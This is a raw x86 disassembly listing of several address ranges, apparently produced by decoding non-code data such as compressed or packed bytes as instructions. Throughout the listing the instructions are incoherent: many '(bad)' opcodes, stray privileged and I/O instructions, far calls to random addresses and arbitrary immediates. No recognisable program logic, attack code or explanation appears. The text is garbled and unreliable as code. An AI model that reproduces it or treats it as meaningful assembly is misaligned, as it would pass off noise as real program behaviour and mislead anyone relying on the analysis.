  416f9c:	test   ecx,eax
  416f9e:	das    
  416f9f:	mov    fs,ebp
  416fa1:	adc    BYTE PTR [esp+edx*4],bl
  416fa4:	arpl   WORD PTR [edi],bx
  416fa6:	call   0xc7b7a116
  416fab:	dec    esi
  416fac:	pop    es
  416fad:	fbstp  TBYTE PTR [edx-0x36ea0ccf]
  416fb3:	xchg   esi,eax
  416fb4:	stc    
  416fb5:	std    
  416fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fb7:	add    esi,DWORD PTR [eax-0x6e]
  416fba:	fisttp QWORD PTR [esi]
  416fbc:	jb     0x416ffb
  416fbe:	sar    BYTE PTR [eax+0x78],1
  416fc1:	loop   0x416f44
  416fc3:	jg     0x416fb3
  416fc5:	push   eax
  416fc6:	lea    edx,[ecx+0x76d2f274]
  416fcc:	fnstenv [esi+0x7129d692]
  416fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fd3:	je     0x417014
  416fd5:	out    0x4a,eax
  416fd7:	into   
  416fd8:	lods   eax,DWORD PTR ds:[esi]
  416fd9:	lahf   
  416fda:	push   cs
  416fdb:	fwait
  416fdc:	fs push edx
  416fde:	ds ja  0x417028
  416fe1:	cmp    DWORD PTR [ebx+ecx*4+0x59],ecx
  416fe5:	ret    0xc7cc
  416fe8:	icebp  
  416fe9:	push   ss
  416fea:	xchg   ecx,ecx
  416fec:	mov    edx,0xf252208e
  416ff1:	lea    ecx,[ebx-0x16]
  416ff4:	nop
  416ff5:	ins    DWORD PTR es:[edi],dx
  416ff6:	fsubr  QWORD PTR [edi-0x1aa1b534]
  416ffc:	mov    al,ds:0x175130d9
  417001:	loope  0x41705e
  417003:	mov    ebp,0x6ac8523a
  417008:	mov    ecx,esi
  41700a:	and    ebp,DWORD PTR [edx+0x5201289c]
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esp,DWORD PTR [ebp+0x60b57088]
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	int    0xed
  41708e:	add    al,0x7f
  417090:	int    0xbf
  417092:	sti    
  417093:	fwait
  417094:	mov    esi,0x8af7f2ae
  417099:	jnp    0x4170a7
  41709b:	mov    ebp,0x8353f520
  4170a0:	mov    BYTE PTR [esi],al
  4170a2:	cmp    ebx,ecx
  4170a4:	xchg   esi,eax
  4170a5:	sbb    al,al
  4170a7:	and    DWORD PTR ds:0x517965de,eax
  4170ad:	xor    DWORD PTR ds:0xaed5ff80,esp
  4170b3:	loopne 0x41711e
  4170b5:	retf   
  4170b6:	dec    eax
  4170b7:	dec    ecx
  4170b8:	pop    edx
  4170b9:	adc    DWORD PTR [eax+ebp*8-0x50],esp
  4170bd:	fild   WORD PTR [eax]
  4170bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170c0:	ja     0x4170cb
  4170c2:	xor    bh,bh
  4170c4:	iret   
  4170c5:	xchg   DWORD PTR [eax-0x2],eax
  4170c8:	dec    eax
  4170c9:	popa   
  4170ca:	sbb    edx,0xec6e282b
  4170d0:	sbb    ah,BYTE PTR [esi+0x27]
  4170d3:	add    ch,BYTE PTR [ebx-0x554bc792]
  4170d9:	lock jmp DWORD PTR [ebx-0x2355d32]
  4170e0:	mov    cl,0x4d
  4170e2:	adc    ebp,eax
  4170e4:	add    ch,dl
  4170e6:	mov    al,ds:0xb6aa580d
  4170eb:	rol    ebp,0x25
  4170ee:	fcomp  st(7)
  4170f0:	jmp    0x76ede409
  4170f5:	xchg   edx,eax
  4170f6:	jecxz  0x417140
  4170f8:	inc    eax
  4170f9:	aad    0x89
  4170fb:	dec    edi
  4170fc:	pop    esp
  4170fd:	push   ebp
  4170fe:	dec    edi
  4170ff:	mov    bh,BYTE PTR [edi]
  417101:	mov    bh,0xd9
  417103:	ret    
  417104:	mov    ecx,DWORD PTR [edx-0x403007ea]
  41710a:	mov    ah,0xb1
  41710c:	adc    DWORD PTR [ebx+ebp*8-0x3b],ebp
  417110:	lods   al,BYTE PTR ds:[esi]
  417111:	outs   dx,BYTE PTR ds:[esi]
  417113:	repnz xchg edi,eax
  417115:	cs dec ecx
  417117:	cmp    eax,0xdf58cf58
  41711c:	xchg   ebp,eax
  41711d:	loopne 0x417160
  41711f:	std    
  417120:	fiadd  WORD PTR [edi-0x17293290]
  417127:	sbb    ebp,DWORD PTR [edx+ebp*2]
  41712a:	cmp    bl,BYTE PTR ds:0x4bde71a9
  417130:	dec    edi
  417131:	inc    esi
  417132:	xor    eax,0x4ecddbd7
  417137:	pop    ds
  417138:	inc    esp
  417139:	and    DWORD PTR [ecx+ebp*8-0x67],ecx
  41713d:	push   edi
  41713e:	(bad)  
  41713f:	and    BYTE PTR [ebx-0x3a666fa3],ch
  417145:	popf   
  417146:	inc    edi
  417147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417148:	xchg   edx,eax
  417149:	stc    
  41714a:	dec    esp
  41714b:	fninit 
  41714d:	ror    BYTE PTR [edx],0x9e
  417150:	mov    ecx,0xa8975cbd
  417155:	gs push cs
  417157:	ins    BYTE PTR es:[edi],dx
  417158:	outs   dx,BYTE PTR ds:[esi]
  417159:	loopne 0x417138
  41715b:	xchg   esi,eax
  41715d:	sar    BYTE PTR [edx-0x42],cl
  417160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417161:	inc    BYTE PTR [esi]
  417163:	pop    ebx
  417164:	jge    0x417193
  417166:	fs adc al,0xbf
  417169:	mov    ebp,0x825fb16c
  41716e:	jne    0x417104
  417170:	outs   dx,DWORD PTR ds:[esi]
  417171:	ret    
  417172:	mov    esp,0xc46f3378
  417177:	popa   
  417178:	pop    ebx
  417179:	cmp    BYTE PTR [edi-0x20],dl
  41717c:	dec    ebp
  41717d:	sub    dh,0xee
  417180:	sub    eax,0x7af88705
  417185:	cld    
  417186:	dec    ebx
  417187:	repnz sub eax,0xc84863f4
  41718d:	stc    
  41718e:	int    0xdc
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	fld    QWORD PTR [ebx+0x52]
  417203:	clc    
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	inc    ebp
  41720d:	jo     0x417202
  41720f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417210:	push   DWORD PTR [ebx]
  417212:	pop    esp
  417213:	mov    edx,0x83c313c9
  417218:	push   0xffffff95
  41721a:	rcr    DWORD PTR ds:0xa5aded9d,cl
  417220:	push   ss
  417221:	or     al,al
  417223:	in     eax,0x3
  417225:	int3   
  417226:	lock push esp
  417228:	jns    0x4172a6
  41722a:	mov    al,ds:0x1e0ce7d1
  41722f:	(bad)  
  417230:	xor    esp,DWORD PTR [eax+0x44]
  417233:	cmp    ebp,ebx
  417235:	add    edx,DWORD PTR ds:0x14b116e9
  41723b:	lods   al,BYTE PTR ds:[esi]
  41723c:	ficom  WORD PTR gs:[edi]
  41723f:	push   ds
  417240:	sbb    ecx,DWORD PTR [ecx+0x317fa6f1]
  417246:	lahf   
  417247:	call   FWORD PTR [ebp+0xea140ca]
  41724d:	or     esp,DWORD PTR [esi+ebp*1]
  417250:	cmp    eax,0x4395d5f5
  417255:	out    dx,eax
  417256:	pop    edi
  417257:	push   ds
  417258:	jle    0x417281
  41725a:	lock mov eax,0xc7207028
  417260:	mov    eax,0x6ac31a1c
  417265:	mov    ecx,0x32eba11a
  41726a:	jnp    0x41724a
  41726c:	or     eax,0xb21bad39
  417271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417272:	adc    BYTE PTR ds:[eax-0x51],ah
  417276:	enter  0x156d,0x8f
  41727a:	loope  0x4172d5
  41727c:	xchg   ecx,eax
  41727d:	pusha  
  41727e:	jne    0x4172b9
  417280:	stc    
  417281:	add    edi,DWORD PTR [ebx+0x31]
  417284:	lods   al,BYTE PTR ds:[esi]
  417285:	pop    es
  417286:	push   esi
  417287:	fst    DWORD PTR [ebp+0x5b]
  41728a:	sub    al,0xae
  41728c:	mov    ds:0xb6f8a9ae,eax
  417291:	add    al,BYTE PTR [edx-0x47]
  417294:	dec    edx
  417295:	inc    ebx
  417296:	retf   0xe68a
  417299:	or     BYTE PTR [ebx-0x7e14a44a],dh
  41729f:	mov    edi,0xa9bfa293
  4172a4:	inc    edi
  4172a5:	dec    ebp
  4172a6:	mov    dl,0x32
  4172a8:	cdq    
  4172a9:	arpl   WORD PTR ds:0x86ac3091,bp
  4172af:	xchg   DWORD PTR [esi+0x183d8ee4],eax
  4172b5:	jae    0x4172ae
  4172b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b8:	mov    dl,0xfa
  4172ba:	xchg   BYTE PTR [edx-0xe8e451b],dh
  4172c0:	dec    edi
  4172c1:	add    DWORD PTR [eax-0x4883ca9a],0x73d1f052
  4172cb:	mov    eax,ds:0x117b5fcf
  4172d0:	xor    esp,DWORD PTR [edi-0x32]
  4172d3:	scas   eax,DWORD PTR es:[edi]
  4172d4:	scas   eax,DWORD PTR es:[edi]
  4172d5:	jns    0x417312
  4172d7:	sbb    eax,esp
  4172d9:	aas    
  4172da:	scas   al,BYTE PTR es:[edi]
  4172db:	and    esi,DWORD PTR [esi+ecx*8-0x7c]
  4172df:	sub    eax,0xcbf64848
  4172e4:	loop   0x417273
  4172e6:	out    dx,al
  4172e7:	jbe    0x41727a
  4172e9:	pop    ebx
  4172ea:	test   BYTE PTR [edi-0x2cccd246],bl
  4172f0:	sbb    eax,0x95c82fec
  4172f5:	lahf   
  4172f6:	xchg   esi,eax
  4172f7:	xor    dh,dh
  4172f9:	test   BYTE PTR [edi+0x54],cl
  4172fc:	inc    ecx
  4172fd:	sbb    dl,BYTE PTR [edi+0x22b7b712]
  417303:	mov    dh,0xa2
  417305:	repz dec edi
  417307:	int    0xc8
  417309:	pop    ecx
  41730a:	or     BYTE PTR [ecx],bh
  41730c:	cmp    eax,0x34a9ea
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	adc    ch,ch
  417382:	test   cl,al
  417384:	push   0x40000f5
  417389:	add    DWORD PTR [eax],eax
  41738b:	add    BYTE PTR [eax+ebx*2+0x54],bl
  41738f:	mov    ebp,0xfebbd38f
  417394:	jno    0x4173d9
  417396:	outs   dx,DWORD PTR ds:[esi]
  417397:	inc    eax
  417398:	rcr    DWORD PTR [edx*1-0x51ed1ec7],cl
  41739f:	outs   dx,DWORD PTR ds:[esi]
  4173a0:	mov    ebp,0x9735bc6f
  4173a5:	mov    esi,DWORD PTR [edi+0x61]
  4173a8:	pop    ecx
  4173a9:	pop    edx
  4173aa:	push   eax
  4173ab:	cmc    
  4173ac:	xchg   esi,eax
  4173ad:	jns    0x4173f3
  4173af:	enter  0xa02a,0x70
  4173b3:	and    edi,esi
  4173b5:	mov    al,dh
  4173b7:	pop    esp
  4173b8:	jo     0x4173fd
  4173ba:	push   es
  4173bb:	shr    DWORD PTR ds:0xbaba4dff,cl
  4173c1:	dec    edx
  4173c2:	mov    WORD PTR [eax],ss
  4173c4:	and    ch,dl
  4173c6:	add    BYTE PTR [ecx-0x5b71d412],dl
  4173cc:	repz inc esp
  4173ce:	call   0x89f894dc
  4173d3:	xchg   ecx,eax
  4173d4:	add    eax,0x2a0b0835
  4173d9:	cmp    esi,0x40658cda
  4173df:	add    BYTE PTR [ebx-0x63128553],dl
  4173e5:	(bad)  
  4173e6:	clc    
  4173e7:	adc    BYTE PTR [esi-0x1a427c56],ah
  4173ed:	aas    
  4173ee:	imul   ebp,DWORD PTR [ecx-0x121e55e0],0x25
  4173f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173f6:	or     esi,DWORD PTR [ebx+edi*8]
  4173f9:	sub    al,0x79
  4173fb:	lds    edi,FWORD PTR [edx+0x711101c8]
  417401:	loope  0x4173db
  417403:	retf   
  417404:	loope  0x417405
  417406:	dec    esi
  417407:	adc    edx,ecx
  417409:	out    0x1a,eax
  41740b:	jle    0x417416
  41740d:	cs out dx,al
  41740f:	aaa    
  417410:	call   0x288e:0xb386be86
  417417:	shl    BYTE PTR [eax],cl
  417419:	adc    DWORD PTR [eax-0x4f],edi
  41741c:	adc    DWORD PTR [esi],edi
  41741e:	mov    ebx,0xc1797637
  417423:	mov    ah,0x20
  417425:	xchg   esp,eax
  417426:	or     eax,0xf65c6902
  41742b:	fist   WORD PTR [edi+eax*4]
  41742e:	data16 or dh,cl
  417431:	call   0x7d9e:0xcc0a4594
  417438:	adc    ebx,ebx
  41743a:	add    DWORD PTR [edx],edi
  41743c:	jle    0x4173d9
  41743e:	cmp    BYTE PTR [ebx-0x45fad62],dl
  417444:	(bad)  
  417445:	dec    ecx
  417446:	mov    esi,DWORD PTR [edx-0x59ade8d0]
  41744c:	jbe    0x417402
  41744e:	(bad)  
  41744f:	out    dx,eax
  417450:	retf   
  417451:	icebp  
  417452:	fld    DWORD PTR cs:[eax]
  417455:	mov    ds:0xe85ca458,al
  41745a:	clc    
  41745b:	mov    esi,0x49fc14b1
  417460:	call   0xe4f9d037
  417465:	cld    
  417466:	mov    al,0x20
  417468:	mov    esp,0x5b6528df
  41746d:	ins    BYTE PTR es:[edi],dx
  41746e:	adc    eax,0xe598e812
  417473:	test   BYTE PTR [ecx-0xe],ah
  417476:	loop   0x41741e
  417478:	div    DWORD PTR [edx+0xb]
  41747b:	jg     0x41747c
  41747d:	xchg   DWORD PTR [ebx+0x11],edx
  417480:	mov    eax,0x2e3510d8
  417485:	adc    al,0xb4
  417487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417488:	jge    0x4174b2
  41748a:	dec    ecx
  41748b:	pop    ecx
  41748c:	stos   DWORD PTR es:[edi],eax
  41748d:	stos   DWORD PTR es:[edi],eax
  41748e:	cwde   
  41748f:	jp     0x417491
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	mov    ch,0x20
  417502:	xor    al,0x6a
  417504:	ins    BYTE PTR es:[edi],dx
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	xchg   esi,eax
  41750d:	shl    DWORD PTR ds:0xc0e1d451,1
  417513:	or     al,0xee
  417515:	pop    esi
  417516:	ret    
  417517:	mov    edx,0xcf15448e
  41751c:	add    al,0x8b
  41751e:	loope  0x41755a
  417520:	lock mov dl,0xbf
  417523:	fisttp QWORD PTR [ebp-0x5e]
  417526:	adc    al,0xf0
  417528:	add    eax,0x954fcce6
  41752d:	lods   eax,DWORD PTR ds:[esi]
  41752e:	les    edi,FWORD PTR [eax]
  417530:	lahf   
  417531:	ret    
  417532:	retf   0x1223
  417535:	dec    ecx
  417536:	cmc    
  417537:	ss (bad) 
  417539:	mov    ds:0x7a02ac2c,al
  41753e:	mov    cl,0x7c
  417540:	lock lock ret 0x8ab6
  417545:	push   ecx
  417546:	mov    eax,0x2932f2ff
  41754b:	popf   
  41754c:	ss retf 
  41754e:	sahf   
  41754f:	inc    ecx
  417550:	push   eax
  417551:	cs nop
  417553:	stos   DWORD PTR es:[edi],eax
  417554:	mov    ebp,0x7fb52810
  417559:	call   0x414f:0xc298b37f
  417560:	lahf   
  417561:	lock pusha 
  417563:	jo     0x4174fe
  417565:	cmp    DWORD PTR [ecx-0x4c8daf1c],ebp
  41756b:	or     DWORD PTR [ecx-0x58],0x51
  41756f:	std    
  417570:	jnp    0x417538
  417572:	add    ecx,edi
  417574:	shl    edx,0xc5
  417577:	test   DWORD PTR [edx+esi*2],esi
  41757a:	push   ss
  41757b:	(bad)  
  41757c:	mov    edx,0x4a31e0f
  417581:	or     eax,DWORD PTR ds:0xb6b7c92e
  417587:	in     eax,dx
  417588:	add    bh,BYTE PTR [eax+0x11a3ce92]
  41758e:	jae    0x4175c3
  417590:	int3   
  417591:	jae    0x417555
  417593:	fwait
  417594:	lea    ecx,[edi+0x29]
  417597:	jb     0x417591
  417599:	daa    
  41759a:	adc    DWORD PTR [edi+esi*1-0x5e91d269],ebx
  4175a1:	call   0xe92e76a
  4175a6:	test   al,0x86
  4175a8:	pop    edi
  4175a9:	test   DWORD PTR [edi-0x14],eax
  4175ac:	in     eax,0x2e
  4175ae:	enter  0xef99,0xed
  4175b2:	push   ds
  4175b3:	pop    edx
  4175b4:	leave  
  4175b5:	cmp    DWORD PTR [esp+eiz*2],esp
  4175b8:	jb     0x41761f
  4175ba:	and    ebx,ebp
  4175bc:	cmp    ch,BYTE PTR [ebp+0x2b]
  4175bf:	cmp    DWORD PTR [edx-0x2e],ebx
  4175c2:	scas   al,BYTE PTR es:[edi]
  4175c3:	xchg   ebp,eax
  4175c4:	lds    ebx,FWORD PTR [ecx+0x78f543e9]
  4175ca:	(bad)  
  4175cb:	je     0x41754f
  4175cd:	mov    BYTE PTR [edi-0x1f],bl
  4175d0:	cmp    al,0x2a
  4175d2:	jo     0x4175de
  4175d4:	out    dx,al
  4175d5:	jae    0x4175ff
  4175d7:	inc    esp
  4175d8:	nop
  4175d9:	push   ds
  4175da:	push   ss
  4175db:	jo     0x417588
  4175dd:	push   es
  4175de:	addr16 xchg ecx,eax
  4175e0:	and    eax,0x7d4c9c2f
  4175e5:	jns    0x4175fd
  4175e7:	xor    ecx,DWORD PTR [esi-0x12]
  4175ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175eb:	adc    eax,0x1de77c37
  4175f0:	cld    
  4175f1:	aaa    
  4175f2:	sbb    DWORD PTR [ebx],ebp
  4175f4:	mov    dh,0x14
  4175f6:	fld    TBYTE PTR [ebp-0x43]
  4175f9:	sub    edi,ebx
  4175fb:	cwde   
  4175fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175fd:	pop    ds
  4175fe:	data16 or al,0x80
  417601:	pop    ss
  417602:	inc    eax
  417603:	(bad)  
  417605:	sub    ebx,esi
  417607:	inc    ebp
  417608:	inc    edx
  417609:	dec    ecx
  41760a:	repnz cmp cl,bh
  41760d:	pop    ebp
  41760e:	xchg   ebx,eax
  41760f:	add    BYTE PTR [eax],0x0
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	ficom  DWORD PTR [eax+esi*1+0x1e]
  417683:	xor    DWORD PTR [eax-0x9],0x0
  417687:	add    BYTE PTR [ecx+eax*1],al
  41768a:	add    BYTE PTR [eax],al
  41768c:	(bad)  
  41768d:	xchg   ebx,eax
  41768e:	jbe    0x417614
  417690:	cwde   
  417691:	mov    al,ds:0x21281a92
  417696:	sahf   
  417697:	test   al,0xbc
  417699:	fs shl edi,cl
  41769c:	push   edi
  41769d:	sub    ah,BYTE PTR [edi-0x65]
  4176a0:	add    esi,DWORD PTR [edx-0x6b]
  4176a3:	pop    ebx
  4176a4:	sub    edi,DWORD PTR [edx+0x7c8a30a3]
  4176aa:	push   ds
  4176ab:	pop    esi
  4176ac:	std    
  4176ad:	neg    DWORD PTR [edx+0x39]
  4176b0:	or     ch,BYTE PTR [ebx+0x4c]
  4176b3:	pop    ss
  4176b4:	rol    DWORD PTR [ecx-0x37],cl
  4176b7:	sahf   
  4176b8:	jnp    0x4176ee
  4176ba:	int3   
  4176bb:	sbb    bl,BYTE PTR [edi-0x6e8ed693]
  4176c1:	loope  0x4176bb
  4176c3:	sahf   
  4176c4:	jmp    0x4176f5
  4176c6:	(bad)  
  4176c7:	shl    BYTE PTR [ecx+esi*2-0x39098f51],1
  4176ce:	pop    ecx
  4176cf:	mov    esi,0x4f643816
  4176d4:	push   esi
  4176d5:	cdq    
  4176d6:	jmp    0x417707
  4176d8:	(bad)  
  4176d9:	jmp    0x874f:0xde146507
  4176e0:	div    BYTE PTR [edi-0x1f]
  4176e3:	imul   ebx,DWORD PTR [bp+si-0x6307],0xffffff90
  4176e9:	clc    
  4176ea:	xchg   dh,ah
  4176ec:	pop    edi
  4176ed:	lock mov esp,0xc28d2569
  4176f3:	jecxz  0x417689
  4176f5:	adc    DWORD PTR [esi],0x1ac1fe94
  4176fb:	dec    eax
  4176fc:	inc    edi
  4176fd:	jnp    0x417743
  4176ff:	sub    al,0x1d
  417701:	enter  0x6417,0x1b
  417705:	jmp    0x4176f3
  417707:	mov    ss,WORD PTR [ecx-0x1b]
  41770a:	xor    BYTE PTR [eax+0x10],dh
  41770d:	dec    eax
  41770e:	pop    ebx
  41770f:	mov    WORD PTR [eax+edx*8-0x71ee7113],ds
  417716:	pop    es
  417717:	adc    eax,0x8d2712db
  41771c:	xor    al,0x56
  41771e:	jnp    0x4176cc
  417720:	sbb    bh,BYTE PTR [edx]
  417722:	inc    ebx
  417723:	fisub  WORD PTR [ebp+esi*4-0x47aef08e]
  41772a:	inc    eax
  41772b:	test   al,0x2c
  41772d:	shl    BYTE PTR [ebp-0x3fb0e018],cl
  417733:	cmp    ebx,DWORD PTR [edx-0xfb86031]
  417739:	js     0x417760
  41773b:	lds    esp,FWORD PTR [esi-0x36]
  41773e:	xor    edi,esi
  417740:	sti    
  417741:	ret    0xfa6e
  417744:	xor    eax,0x8a04952e
  417749:	mov    edi,0x5e012a2f
  41774e:	xchg   ebx,eax
  41774f:	and    eax,0x8f925628
  417754:	(bad)  [ebx]
  417756:	shr    BYTE PTR [ebx],cl
  417758:	jg     0x4176db
  41775a:	stc    
  41775b:	fiadd  WORD PTR [ecx+0x7a32f815]
  417761:	xor    bl,BYTE PTR [ecx]
  417763:	cwde   
  417764:	dec    eax
  417765:	add    DWORD PTR ds:0x43617c01,ebp
  41776b:	ins    DWORD PTR es:[edi],dx
  41776c:	sbb    BYTE PTR [ebp-0x14a40a5b],cl
  417772:	retf   
  417773:	xor    edi,DWORD PTR [esi+0x359cc390]
  417779:	sbb    al,0x87
  41777b:	addr16 loop 0x4177d4
  41777e:	daa    
  41777f:	dec    eax
  417780:	nop
  417781:	jg     0x41772b
  417783:	aas    
  417784:	repz xor al,0x4f
  417787:	sbb    DWORD PTR [eax-0xc],0x78f342d7
  41778e:	sub    DWORD PTR [edx+0x0],eax
	...
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	jle    0x41779a
  417802:	(bad)  
  417803:	shl    DWORD PTR [eax+edi*8+0x0],cl
  417807:	add    BYTE PTR [ecx+eax*1],al
  41780a:	add    BYTE PTR [eax],al
  41780c:	jno    0x4177ad
  41780e:	out    0xfb,eax
  417810:	sbb    al,0x18
  417812:	or     esp,ebx
  417814:	mov    al,ds:0xb2824734
  417819:	gs cmp al,0xfb
  41781c:	mov    esi,0x73f35e13
  417821:	jb     0x4177f2
  417823:	jbe    0x417877
  417825:	int3   
  417826:	aam    0xfa
  417828:	aad    0xeb
  41782a:	xchg   ebx,eax
  41782b:	xchg   esi,eax
  41782c:	sbb    al,0x1b
  41782e:	adc    al,0x28
  417830:	gs fs enter 0x5c82,0xfd
  417836:	cld    
  417837:	clc    
  417838:	int    0x48
  41783a:	adc    al,0x95
  41783c:	shl    BYTE PTR [ecx+esi*2],cl
  41783f:	pop    ebp
  417840:	mov    ds:0xd7377641,al
  417845:	inc    edx
  417846:	inc    eax
  417847:	mov    esp,0xb4313444
  41784c:	jle    0x41788e
  41784e:	js     0x4178b3
  417850:	or     ecx,DWORD PTR [eax-0x62]
  417853:	int3   
  417854:	or     eax,0xd2a6e1ed
  417859:	call   0x4b99:0x72dc5a81
  417860:	cmp    ch,BYTE PTR [ecx-0x3]
  417863:	push   ebx
  417864:	adc    ah,cl
  417866:	and    DWORD PTR [edi+0x26],0xfffffffc
  41786a:	inc    ecx
  41786b:	or     BYTE PTR ds:0x85e9c81f,bl
  417871:	pop    esi
  417872:	mul    DWORD PTR [ecx+0x33]
  417875:	stc    
  417876:	ins    BYTE PTR es:[edi],dx
  417877:	or     DWORD PTR [eax+ebx*8-0x1d],ecx
  41787b:	jmp    FWORD PTR [ecx+ebx*4-0x4716c48a]
  417882:	and    DWORD PTR [esp+esi*1+0x24556468],0xffffffeb
  41788a:	mov    ebp,0x971137d5
  41788f:	aas    
  417890:	iret   
  417891:	inc    edi
  417892:	mov    BYTE PTR [bx+si-0x48ac],dl
  417897:	xor    eax,0xc16afac2
  41789c:	jle    0x4178d2
  41789e:	dec    esi
  41789f:	(bad)  
  4178a0:	sub    eax,0x3e6fb645
  4178a5:	iret   
  4178a6:	out    0x83,eax
  4178a8:	inc    esp
  4178a9:	enter  0xcd5f,0x50
  4178ad:	add    DWORD PTR ds:0xf503a42e,ebp
  4178b3:	pop    ecx
  4178b4:	and    eax,0x23e2700d
  4178b9:	push   0xffffffc3
  4178bb:	ss ja  0x4178e9
  4178be:	dec    ecx
  4178bf:	aas    
  4178c0:	neg    BYTE PTR [ebx-0x1283a2ff]
  4178c6:	mov    ah,0x1c
  4178c8:	push   0x4c1a8882
  4178cd:	shl    esp,cl
  4178cf:	mov    ecx,0xc7431492
  4178d4:	pop    ecx
  4178d5:	int3   
  4178d6:	retf   
  4178d7:	pop    edi
  4178d8:	push   edi
  4178d9:	nop    DWORD PTR [ebp-0xd3922a0]
  4178e0:	fidivr WORD PTR [ebp-0x5d7a93d1]
  4178e6:	in     al,0x7a
  4178e8:	dec    ecx
  4178e9:	fidiv  DWORD PTR [ebp-0x1b]
  4178ec:	push   edx
  4178ed:	push   eax
  4178ee:	xlat   BYTE PTR ds:[ebx]
  4178ef:	mov    al,0x7c
  4178f1:	push   esi
  4178f2:	sub    al,0xdc
  4178f4:	sub    al,0x17
  4178f6:	loop   0x4178a5
  4178f8:	mov    WORD PTR [ebp-0xc],cs
  4178fb:	ins    BYTE PTR es:[edi],dx
  4178fc:	jecxz  0x4178c7
  4178fe:	mov    edx,0x2cbf5a37
  417903:	mov    eax,0xfc159cf5
  417908:	jle    0x4178fb
  41790a:	and    DWORD PTR [esi],eax
  41790c:	out    dx,al
  41790d:	adc    ah,BYTE PTR [esi+0x6]
	...
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	cld    
  417981:	inc    edx
  417982:	mov    ebx,0xf978b8
  417987:	add    BYTE PTR [ecx+eax*1],al
  41798a:	add    BYTE PTR [eax],al
  41798c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41798d:	in     eax,0xc
  41798f:	dec    ecx
  417990:	ins    BYTE PTR es:[edi],dx
  417991:	sub    bl,dl
  417993:	fldenv [ebp+ebx*2+0x7a]
  417997:	test   eax,0xab7468c7
  41799c:	push   eax
  41799d:	loope  0x41792d
  41799f:	mov    BYTE PTR [edx],ch
  4179a1:	mov    ebp,0x5111ceab
  4179a6:	sub    al,0x25
  4179a8:	aad    0x53
  4179aa:	pop    edx
  4179ab:	inc    esi
  4179ac:	mov    DWORD PTR ds:0xb763fab7,ebx
  4179b2:	cmp    al,0xeb
  4179b4:	test   DWORD PTR [ecx+edx*4-0x34fce101],ebx
  4179bb:	pop    ss
  4179bc:	mov    ah,0xc5
  4179be:	mov    ebp,0x8e04660c
  4179c3:	pop    es
  4179c4:	lahf   
  4179c5:	mov    ebp,0x59292d
  4179ca:	mov    bh,0x2c
  4179cc:	in     eax,dx
  4179cd:	out    dx,eax
  4179ce:	pop    edi
  4179cf:	add    DWORD PTR [edx-0x4f43c5fc],esp
  4179d5:	mov    eax,0x6e48ba5c
  4179da:	pop    edx
  4179db:	push   edx
  4179dc:	imul   edi,DWORD PTR [edi+0x6cd622b1],0x18a52d22
  4179e6:	or     bh,BYTE PTR [ecx+0x2c]
  4179e9:	stc    
  4179ea:	mov    eax,ds:0x9cb7b8de
  4179ef:	mov    ds:0x8ed03436,al
  4179f4:	out    dx,al
  4179f5:	aad    0xdb
  4179f7:	ret    0x48d5
  4179fa:	cmp    edx,DWORD PTR [esp-0xdaa2817]
  417a01:	ja     0x417a3e
  417a03:	xor    dh,BYTE PTR [ecx+0x706a24c4]
  417a09:	das    
  417a0a:	out    0x2c,al
  417a0c:	mov    ecx,0x75f2aa56
  417a11:	fidiv  WORD PTR [edi-0x39]
  417a14:	adc    BYTE PTR [edx+0x2d407d29],0x1b
  417a1b:	mov    ebx,0x62da2551
  417a20:	rcr    DWORD PTR [eax],cl
  417a22:	fdiv   DWORD PTR [esi+0x60]
  417a25:	mov    ah,0x15
  417a27:	test   BYTE PTR [ebx+0x7b],0x80
  417a2b:	jbe    0x417a2a
  417a2d:	jo     0x4179f7
  417a2f:	and    eax,DWORD PTR [ebx+ebp*1+0x52]
  417a33:	jo     0x417a3e
  417a35:	addr16 dec edi
  417a37:	jle    0x417a48
  417a39:	ds es dec ebx
  417a3c:	jle    0x417a37
